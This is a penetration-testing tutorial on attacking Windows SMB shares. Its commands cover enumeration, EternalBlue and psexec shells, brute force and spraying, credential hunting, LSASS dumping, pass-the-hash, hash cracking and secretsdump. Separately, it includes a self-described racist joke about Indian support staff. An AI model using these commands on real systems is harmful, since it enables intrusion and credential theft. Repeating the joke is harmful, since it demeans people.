---
id: ckb-b3f97a64b279
title: Let's hack some SMB
category: offensive-security
format: article
language: en
tags: [bash, credential-access, networking, password-security, tls, windows]
authors: [unknown]
license: NOASSERTION
added: 2026-10-04
classification:
  method: heuristic
  confidence: 0.47
---

# Let's hack some SMB

[Server Message Block (SMB)](https://en.wikipedia.org/wiki/Server_Message_Block), also known as Common Internet File System (CIFS), is a network protocol mainly used for providing shared access to files, printers, serial ports and miscellaneous communications between nodes on a network.

Versions of Windows SMB
CIFS: The old version of SMB, which was included in Microsoft Windows NT 4.0 in 1996.
SMB 1.0/SMB1: The version used in Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2.
SMB 2.0/SMB2: This version used in Windows Vista and Windows Server 2008.
SMB 2.1/SMB2.1: This version used in Windows 7 and Windows Server 2008 R2.
SMB 3.0/SMB3: This version used in Windows 8 and Windows Server 2012.
SMB 3.02/SMB3: This version used in Windows 8.1 and Windows Server 2012 R2.
SMB 3.1: This version used in Windows Server 2016 and Windows 10.

Network shares are gold mine for a penetration tester. If you have access to a corporate network, you can find a lot of useful information about the company, users, polices and configuration, just by scanning SMB. Bigger (scattered all over the world) and older company is better, especially the one from production sector, but don’t take is as a rule. It’s just a tip.

![smb hacking](networkshares.jpg)

When you get into such a network you just start scanning SMB protocol to verify versions, shares and permissions. You can find something really interesting using anonymous access (stupid things like nudes of your coworker, photos from vacations of your boss, HR lady ID scan of whole family and other personal data on corporate machine), but best things are always accessible by standard domain user. Everyone thinks that once something is restricted to users it’s good enough. But making everything available to all users is not always a good solution. [Principle of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) should be implemented here as something mandatory. Fortunately for pentesters (sadly for the threat actors too) and unfortunately for the companies, most of the time standard user can browse everything and in critical situations write access is possible too. When you escalate your privileges to the admin right in such an environment, you understand then that admins trust other admins by default :)

## Some boring words…

Monitoring file share services and their traffic generates a lot of logs. Not every company can afford it. The older the company, the greater the chance that once upon a time someone shared something with everyone and never withdrew that access, and never took the time to share it correctly, probably thinking that only the person to whom you send a link will look at the folder.

If users have the right to share files on the machine, and the employer has not provided them with a secure platform for file sharing (e.g. OneDrive, Drobox, Google Drive etc.), it will be a mess. On top of that there are admins who sometimes share or test something quickly and it stays that way forever. It’s always because of convenience or lack of knowledge. In addition, there are groups and service accounts, where it can be even more messy.

Imagine a standard mid-sized company with about 2000 servers and 20000 thousand computers, hundreds of groups and service accounts in AD. Average quality security, not everything is monitored, and not all of the service accounts and groups have it owners (because someone forgot to add description, some owner died and some just left the company). Different facilities and branches were set up at different times. During the reconnaissance you see servers with Windows 2003 and computers with XP system, you see a lot of subnets that you have access to. Someone may say, man, we are in the 21st century. Yes we are, but these companies are not :D This is a classic company these days. It is even worse, to make a budget cuts some of the departments are wiped and external vendors are hired. Some parts of services are outsourced. If you are cutting the budgets and fire some of your employees, the external companies you are hiring are cheap :) and support is in India (sorry for that, my Indian colleagues).

As a break from this long introduction check [Every tech support call ever](https://www.youtube.com/watch?v=S2s7nsn-YpA) but to make this article funny for the Indian tech support that accidentally reading this I have [When a Frenchman calls an Indian Call Center](https://www.youtube.com/watch?v=DxxAwDHgQhE) video). Racist joke, checked. Lets continue.

There are so many companies like this, it’s scary. Fortunately, as long as someone doesn’t get in, they are relatively safe. It’s just that some companies think that no one is inside, but in fact someone has been there for months (greetings to [apt groups](https://en.wikipedia.org/wiki/Advanced_persistent_threat)). When something takes years to develop and grows fairly quickly, the mix of technology, solutions and knowledge is very large. Getting something like that properly is a lot of projects, time and money. And as long as nobody understands the threat, there’s no need to spend money on security either. If the production brings money, everything is ok.

Well, because an asset and security audit for that mentioned mid-sized company is just the beginning. Then you need someone who will go through all the domain accounts, groups and fix all the permissions without breaking the company, the running services and all the cosmic dependencies that have been created over the years. Sometimes it is so, that something didn’t work, nobody knew why, so they added admin privileges, and it started to work. Job done.

I am writing this long introduction so that everyone understands the genesis of the problem, because it makes it easier to do reconnaissance, easier to choose the path of attack. And I had to finally get it out of me after so many years of watching messy environments all around the world.

In this optimistic accent let’s move on to the more interesting part. Below I will present different ways and tools for SMB pentesting. These will not be ready-made solutions, but things to start with. I am presenting below various tools because you will never know which one you will have access to during the atta.. pentest :D

### Juicy part

Ports you are most interested in are [139](https://www.speedguide.net/port.php?port=139) and [445](https://www.speedguide.net/port.php?port=445).

It is good to start from banner grabbing, a technique used to gain information about a computer system on a network and the services running on its open ports. Scan target with nmap if you will find info that target system is Windows and port 445 is open then it’s good information.

### Enumeration and…

…building a list of assets with shares and vulnerabilities.

You can start with something simple like standard enumerate hostname:

```bash
nmap -A IP_Address
```

But that is just boring, if you have a list of targets you are interested more in command like:

```bash
nmap -iL list_of_IPs.txt -sV -O -p139,445 -T3 -PN
```

Remember to scan only interesting IP you found, scanning of whole subnets in short time can be detected by SOC team. Make your Nmap scan more targeted and manipulate parameter `-T`. Check more details and techniques reading my article about [Nmap](https://0ut3r.space/2021/12/21/nmap/).

If you have list with open 445 port ready you can also scan for SMB vulnerabilites.

```bash
nmap -iL list_of_445.txt -p139,445 -T3 -PN --script smb-vuln*
```

With credentials just add parameters: `--script-args=smbdomain="DOMAINNAME",smbusername="USERNAME",smbpassword="PASSWORD"`

Scan also for shares that are accessible to guest or anonymous (using [smbmap](https://github.com/ShawnDEvans/smbmap)):

```bash
./smbmap.py -u "" -p "" -P 445 --host-file list_of_targets.txt -g /output_anonymous.txt && ./smbmap.py -u "guest" -p "" -P 445 --host-file list_of_targets.txt -g /output_guest.txt
```

same action different tool ([enum4linux](https://github.com/CiscoCXSecurity/enum4linux)):

```bash
enum4linux -a -u "" -p "" IP && enum4linux -a -u "guest" -p "" IP
```

or overall scan:

```bash
enum4linux -a IP_Address
```

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) is another awesome tool, we will use it later for other actions too:

```bash
cme smb IP -u '' -p '' && cme smb IP -u'a' -p ''
```

List shares automatically and check null sessions using smbmap:

```bash
./smbmap.py -H IP_address
```

Check shares manually to avoid detection of suspicious tools, check connection if password is required:

```bash
smbclient -L IP_Address
```

when it asking for password hit enter. List of folders will be displayed, check if you can browse any.

```powershell
smbclient //IP_Address/Backups
```

### Maybe some exploit

If Nmap showed you vulnerable version of SMB, here quick example how to exploit it.

#### Eternal Blue

Microsoft Windows 7 are exploitable by eternal blue with SMBv1. (CVE-2017-0144). Use Metasploit to exploit.

```bash
use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set rhost IP_Address
msf exploit(ms17_010_eternalblue) > exploit
```

Check other Metasploit modules for SMB. Or just google exploits by CVE or SMB version.

If you have login and password you can access to remote shell (Metasploit again):

```bash
use exploit/windows/smb/psexec
msf exploit windows/smb/psexec) > set rhost IP_Address
msf exploit(windows/smb/psexec) > set smbuser username
msf exploit(windows/smb/psexec) > set smbpass password
msf exploit(windows/smb/psexec) > exploit
```

or using classic solution:

```bash
PsExec.exe /accepteula \\IP_ADDRESS - u DOMAIN\USER -p PASSWORD cmd.exe
```

### Brute Force and password spay

If enumeration doesn’t work and SMB version is patched you can try brute force login and password using hydra.

```bash
hydra -L user.txt -P pass.txt IP_Address smb
```

Sometimes on shares you have access by guest, anonymous or standard domain user, you can find files that will reveal the names of other users from which you can build a list.

Using one script from [Impacket repository](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py) you can also build user list getting them from AD:

```bash
GetADUsers.py -all -dc-ip IP DOMAIN_NAME/USERNAME
```

Having some creds you can check password policy to have better knowledge and build proper password list.

```bash
cme IP -u 'USER' -p 'PASSWORD' --pass-pol
```

Spraying using cme:

```bash
cme smb IP -u user.txt -p password.txt --no-bruteforce
```

### Inventory

If you would like to be a hero in your company or check what other people sharing, make a free inventory using [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares). Tool designed to automatically inventory, analyze, and report excessive privilege assigned to SMB shares on Active Directory domain joined computers. So if you are already in the company network run this from the one of the computers you have access. In big shitty companies analyzing report generated by this tool can take you ages, but findings are delicious.

Report and documented findings can be great opportunity to persuade your boss to invest in security or at least to clean up the sharing shit. This will definitely reduce the attack surface.

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\report
```

If during pentest you will get access to account with higher permission you can run the tool again with additional creds:

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\report -Credentials DOMAIN\USER
```

The result is presented in the form of a beautiful and scarry report:

![PowerHuntShares](powerhuntshares.png)

### Interesting files

When you get access to hundreds of shares with thousand of folders and tens of thousands of files, you’ll start crying. Because, between the boring reports, vacation photos, junk files, programs, presentations, you have to find something to move on. Cybercriminals are of course interested in compromising material, photos of buildings, invoices, e-mails, and places where they can write to change something or put malicious stuff to infect other.

Report from PowerHuntShares have also cvs lists of shares and files, so review it in excel is one option.

Second is to mount share in Linux:

```bash
sudo mount -t cifs //IP/SHARE /mnt/SHARE -o username=USER,password=PASSWORD,domain=DOMAIN
```

or in Windows using Explorer and search for files, extensions and keywords:

```powershell
findstr /si /m 'password' *xml *.ini *.txt
findstr /si 'password' *xml *.ini *.txt *.config
findstr /spin "password" *.*
```

Check [findtrs parameters in official documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).

In Linux you can use grep and find:

```bash
grep -r "password" /mnt/SHARE
grep -H -R "password" /mnt/SHARE/* | cut -d: -f1
find /mnt/SHARE/ -type f -name "*xml" -name "*.ini" -name "*.txt" -name "*.config" -exec grep -l 'password' {} \+
```

Useful parameters `-H` filenames only.

Search registry for passwords:

```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### LSAS, pass-the-hash and hashcat

Dumping [LSAS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) using SMB access is what we want! Again we will use CrackMapExec to do this. There are two modules, [lsassy](https://github.com/Hackndo/lsassy) and [nanodump](https://github.com/helpsystems/nanodump).

```bash
cme smb IP -u USER -p 'PASSWORD' -d DOMAIN -M lsassy
cme smb IP -u USER -p 'PASSWORD' -d DOMAIN -M nanodump
```

Sometimes you will get just hashes sometimes also password. But even hashes are enough because you can use hashes in [pass-the-hash](https://en.wikipedia.org/wiki/Pass_the_hash) technique to authenticate to other systems in domain.

So let say you dumped some hashes for interesting accounts and want to use them on other servers, start cme again but using hash as password:

```bash
cme smb IP -u USER -H NTHASH -d DOMAIN -M lsassy
cme smb IP -u USER -H LMHASH:NTHASH -d DOMAIN -M lsassy
```

Cool right.

You can always try to crack hashes. First check it at [Crackstation](https://crackstation.net/). If password was shitty you got it. If you have your own dictionaries use [Hashcat](https://hashcat.net/hashcat/).

```bash
hashcat -a 0 -m1000 --status -o found.txt hash.txt /dictionary.txt
hashcat -a 0 -m2100 '$DCC2$10240#ACCOUNT#e4e938d12fe5974dc42a90120bd9c90f' /dictionary.txt --force --potfile-disable
```

Hash types can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes).

Using one of [Impacket](https://github.com/SecureAuthCorp/impacket) script called [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) we can also try dump get cached creds.

> Performs various techniques to dump hashes from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp dir) and read the rest of the data from there.
>
> For NTDS.dit we either:
>  a. Get the domain users list and get its hashes
>  and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
>  call, replicating just the attributes we need.
>  b. Extract NTDS.dit via vssadmin executed with the
>  smbexec approach.
>  It’s copied on the temp dir and parsed remotely.
>
> The script initiates the services required for its working
> if they are not available (e.g. Remote Registry, even if it is
> disabled). After the work is done, things are restored to the
> original state.

So if you find some fancy share you have access like c$ or Admin$ then just run:

```bash
impacket-secretdump DOMAIN/USER/:PASSWORD@IP\c$Windows
```

## What next

In general you are searching shares for interesting files, dump hashes and jump from the machine to machine looking for account or group with domain admin :)

SMB scanning is one of the stages of the [Active Directory](https://en.wikipedia.org/wiki/Active_Directory) penetration test. Sometimes it is good to look closer on some AD object details do get passwords and then continue with SMB. But I think this is a topic for the next article. The topic is vast, I may have used a lot of simplifications, but the links in the article and the names of the tools and processes should allow you to develop the topic on your own. I’m just writing that it’s a good idea to keep an eye on your shared resources, because once someone gets inside your business, most doors are open. Everyone just keeps an eye on the edges, where the internal network meets the Internet. The rest is a dark zone.

For more I refer you to my 3 favorite places [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb), [RedTeamingExperiments](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#rpc-netbios-smb) and [Offensive Security Cheatsheet](https://cheatsheet.haax.fr/network/services-enumeration/139_445_smb/).

Nothing else for today, if you got here, congratulations. Now get up and move around, your body will thank you for it.
